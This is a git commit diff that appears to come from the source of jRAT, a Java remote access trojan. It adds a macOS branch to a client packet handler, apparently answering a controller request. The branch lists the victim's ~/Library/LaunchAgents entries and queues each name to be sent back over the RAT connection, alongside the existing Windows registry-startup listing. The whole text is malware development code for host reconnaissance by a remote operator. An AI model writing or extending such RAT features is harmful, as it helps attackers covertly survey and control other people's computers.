0b7d2133c5d1736ce363a5df935d659231526162
redpois0n <red@cmail.nu>
2017-11-17 20:42:42 +0100

    list launch agents on macos

--- modules/system-client/src/jrat/module/system/packets/Packet78RegistryStartup.java
+++ modules/system-client/src/jrat/module/system/packets/Packet78RegistryStartup.java
@@ -2,9 +2,11 @@ package jrat.module.system.packets;
 
 import jrat.client.Connection;
 import jrat.client.packets.incoming.IncomingPacket;
+import jrat.client.utils.Utils;
 import oslib.OperatingSystem;
 
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.InputStreamReader;
 
 
@@ -25,7 +27,18 @@ public class Packet78RegistryStartup implements IncomingPacket {
 					con.addToSendQueue(new Packet53RegistryStartup(args));
 				}
 				reader.close();
-			} else {
+            } else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
+                String home = System.getProperty("user.home");
+
+                if (System.getProperty("user.name").equals("root")) {
+                    home = "";
+                }
+
+                File[] launchAgents =  new File(home + "/Library/LaunchAgents/").listFiles();
+                for (File agent : launchAgents) {
+                    con.addToSendQueue(new Packet53RegistryStartup(agent.getName()));
+                }
+            } else {
 				throw new Exception("Windows only");
 			}
 		} catch (Exception ex) {
